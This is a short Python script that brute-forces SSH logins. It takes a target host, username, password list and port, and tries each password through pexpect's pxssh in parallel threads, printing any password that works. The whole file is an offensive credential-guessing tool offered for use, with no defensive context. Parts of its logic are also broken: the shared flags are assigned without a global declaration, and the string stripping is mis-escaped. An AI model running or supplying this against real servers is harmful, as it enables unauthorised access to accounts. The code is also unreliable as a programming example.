#!/usr/local/bin/python3.5
#__encoding:utf8__

import time
import threading
import optparse

from pexpect import pxssh

Found = False
Fails = 0
connect_lock = threading.BoundedSemaphore(value=5)

def crackSSh(h,u,p,release,pt='22'):
    try:
        s = pxssh.pxssh()
        s.login(h,u,p,port=pt)

        Found = True
        print('[*]Find Password:%s' % p)
        exit(0)

    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            crackSSh(h,u,p,False,pt)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            crackSSh(h,u,p,False,pt)
        elif 'password refused' in str(e):
            print('[-]Error Passwor: %s' % p)
    finally:
        if release:
            connect_lock.release()


def main():
    opt = optparse.OptionParser('usage%prog '+'-H <target host> -u <user> -f <password list> -p <port>')
    opt.add_option('-H',dest='Hostname',type='string',help='Which Server You Will Crack')
    opt.add_option('-u',dest='Username',type='string',help='Which User Will Login In')
    opt.add_option('-f',dest='Filename',type='string',help='Password list')
    opt.add_option('-p',dest='Port',type='string',help='Port')

    (options,args) = opt.parse_args()

    h = options.Hostname
    u = options.Username
    f = options.Filename
    p = options.Port

    if h == None or u == None or f == None:
        print('Params Error!')
        exit(0)

    fn = open(f,'r')

    for passwd in fn.readlines():
        passwd = passwd.strip('\\r').strip('\\n')
        #crackSSh(h,u,passwd,True,pt=p)
        if Found:
            exit(0)

        if Fails > 5:
            print ('[!]Too Much ')
            exit(0)

        connect_lock.acquire()
        t = threading.Thread(target=crackSSh,args=(h,u,passwd,True,p))
        t.start()


if __name__ == '__main__':
    main()
